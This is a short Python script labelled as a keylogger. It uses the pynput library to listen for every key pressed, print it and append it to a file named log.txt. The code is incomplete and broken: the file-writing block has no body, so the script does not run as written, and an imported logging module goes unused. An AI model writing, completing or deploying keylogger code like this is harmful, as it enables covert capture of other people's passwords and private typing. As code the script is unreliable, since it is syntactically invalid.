#Main keylogger
import pynput
from pynput import keyboard
import logging

def Keypress(key):
    print(str(key))
    with open("log.txt", "a") as log:
if __name__ == "__main__":
    listner = keyboard.Listener(on_press=Keypress)
    listner.start()
    input()

